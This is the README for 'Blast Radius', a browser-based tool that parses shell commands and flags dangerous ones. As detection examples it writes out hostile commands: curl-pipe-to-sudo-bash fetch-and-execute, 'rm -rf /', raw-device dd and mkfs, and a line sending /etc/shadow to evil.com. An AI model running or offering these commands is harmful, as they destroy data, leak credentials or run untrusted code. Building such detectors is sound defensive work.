# Blast Radius

**▶ Live demo: [apps.charliekrug.com/blast-radius](https://apps.charliekrug.com/blast-radius/)**

[![CI](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml/badge.svg)](https://github.com/ctkrug/blast-radius/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-35c9c1.svg)](LICENSE)

Paste a shell command and find out if it's safe before you run it. Blast Radius reads the
command the way a shell would, then tells you in plain English what it deletes, where it fetches
from and pipes to, and what it runs as root.

## Why

Shell one-liners get copied from install pages, Stack Overflow, and an AI agent's suggested next
step, then pasted straight into a terminal. A 40-token pipeline of pipes and redirects is hard to
read at a glance, and the usual advice ("read it first") does not scale. Most "is this safe"
checkers are keyword blocklists: they flag `rm -rf ./build` and `rm -rf /` the same way, so they
either cry wolf on everything or miss the one line that matters, because they never look at what
the command *does*, only at which words appear in it.

Blast Radius parses the shell syntax (pipelines, redirects, separators, quoting, `sudo` scope)
and reasons about intent. Paste `curl http://x | sudo bash` and see it flagged red with a
one-line explanation of exactly why, right next to a harmless command flagged green for contrast.

## What it catches

- **Destructive filesystem ops, scoped by target.** `rm -rf /` and `rm -rf ~` are danger; `rm -rf
  ./build` is a routine caution. Also covers `mkfs` and `dd` writing onto a raw device, while
  leaving the safe `dd of=/dev/null` idiom alone.
- **Remote fetch-and-execute.** `curl <url> | sh`, `wget -qO- <url> | bash`, and `curl <url> |
  sudo bash` are flagged as running whatever the server returns as code, and the reason names both
  halves.
- **`sudo` and root scope that compounds.** `sudo apt update` reads as a routine admin caution;
  `sudo rm -rf /` compounds to danger. A command with no escalation shows no root finding.
- **Outbound network and data exfiltration shape.** A plain GET is a caution; `curl -d @/etc/shadow
  https://evil.com` is danger, and the reason names the file leaving the machine and the host.
- **Writes to sensitive paths.** Redirects that overwrite or append to `/etc/passwd`,
  `~/.ssh/authorized_keys`, or shell rc files are flagged, including `$HOME`, `/root`, and
  `/home/<user>` spellings of the same location.
- **Graceful degradation.** An unterminated quote or an unsupported construct like process
  substitution never crashes and never reads a false "safe": you get a partial analysis plus an
  explicit caution that part could not be fully parsed.

## Sample output

Analyzing `curl https://get.example.com/install.sh | sudo bash`:

```
[danger]  Fetches https://get.example.com/install.sh and pipes it straight into
          sudo bash, running whatever the server returns as code with root privileges.
```

Analyzing `git status`:

```
[safe]    No risk findings — nothing here matches a known danger pattern.
```

## How it works

The command is tokenized, parsed into a small shell AST (pipelines, redirects, separators), and
walked by a rule engine. Each rule is a plain function that reasons about parsed structure such as
redirect targets and pipeline stages, never a regex over the raw string. That is what lets it tell
`rm -rf ./build` from `rm -rf /`. Findings carry a severity (`safe` / `caution` / `danger`) and a
one-line reason pointing at the exact part of the command it applies to. See
[`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the data flow and
[`docs/VISION.md`](docs/VISION.md) for the design rationale.

Nothing you paste ever leaves your browser. There is no backend, no logging, and no network call
is made with the command text. Analysis is 100% client-side.

## Development

```bash
npm install
npm run dev       # local dev server (Vite)
npm test          # vitest run, full suite
npm run build     # static build to dist/, deployable at a subpath
npm run lint      # eslint
```

Vanilla TypeScript, built with [Vite](https://vitejs.dev/) and tested with
[Vitest](https://vitest.dev/). No framework, no backend: the app ships as a single `dist/`
directory of relative-path assets and runs entirely in the browser.

## License

MIT, see [LICENSE](LICENSE).

---

More of Charlie's projects → [apps.charliekrug.com](https://apps.charliekrug.com)
